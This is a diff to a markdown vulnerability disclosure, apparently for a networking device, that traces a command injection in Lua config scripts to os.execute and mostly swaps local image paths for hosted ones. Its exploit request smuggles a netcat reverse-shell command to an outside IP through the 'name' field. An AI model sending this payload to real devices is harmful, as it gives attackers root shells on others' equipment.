@@ -20,11 +20,13 @@ An authenticated attacker can execute arbitrary commands with **root** privilege
 
 **usr/local/lua/dev_config/user_list_note.lua**
 
-![image-20260818140300544](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260818140300544.png)
+<img width="999" height="291" alt="图片" src="https://github.com/user-attachments/assets/7cc26ca8-031d-417e-96b0-2f8808239d6b" />
+
 
 **Here, there are obvious characteristics of a command injection vulnerability. Next, the focus should be on examining `sync_list`, which is `child_data`, and then scroll back up to analyze `child_guard_packaged_data`.**
 
-![image-20260818140826264](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260818140826264.png)
+<img width="943" height="418" alt="图片" src="https://github.com/user-attachments/assets/533988b5-92a3-4223-a3e3-8e2fbe199eba" />
+
 
 The logic here dictates that only when an identical MAC address exists will the data be stored into `child_data`, which is a prerequisite for reaching the `os.execute(cmd)` call inside `child_guard_sync`. This ultimately allows the attacker to exploit the controllable `name` parameter for command injection.
 
@@ -41,11 +43,14 @@ gedit ./usr/local/lua/dev_config/child_guard.lua
 
 **Request Entry Point**
 
-![image-20260818150332643](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260818150332643.png)
+<img width="1061" height="368" alt="图片" src="https://github.com/user-attachments/assets/9e098fe8-d18c-4fdb-8fdd-4f99d1bcfa1d" />
 
-![image-20260818150746854](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260818150746854.png)
 
-![image-20260818145328442](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260818145328442.png)
+<img width="884" height="742" alt="图片" src="https://github.com/user-attachments/assets/e673536f-a1e7-423a-aa6a-bca827c9d5a1" />
+
+
+<img width="998" height="553" alt="图片" src="https://github.com/user-attachments/assets/b114f048-43a9-432b-8e7d-ddc0be112939" />
+
 
 The logic here indicates that:
 
@@ -59,7 +64,8 @@ This implies:
 2. Subsequent operations on the same MAC are restricted to **field modifications** (which is precisely where the injectable `name` parameter comes into play).
 3. The path of the persistent configuration file should be noted, as it may be parsed or executed again upon subsequent reads.
 
-![image-20260818150826380](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260818150826380.png)
+<img width="1031" height="186" alt="图片" src="https://github.com/user-attachments/assets/781e5daa-90e5-471d-9eee-99a0f8e6c3a9" />
+
 
 exp
 
@@ -96,8 +102,8 @@ Connection: keep-alive
 
 {"method":"devConfig.update","params":{"module":"user_list_note","data":{"list":[{"mac":"aa:bb:cc:dd:ee:ff","name":"x';nc 10.44.77.10 4444 -e /bin/sh;'"}]}}}
 ```
+<img width="2485" height="1192" alt="图片" src="https://github.com/user-attachments/assets/ddaa2167-f9e8-45f7-8b76-51e07c365cc8" />
 
-![image-20260818151139399](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260818151139399.png)
 
 
 
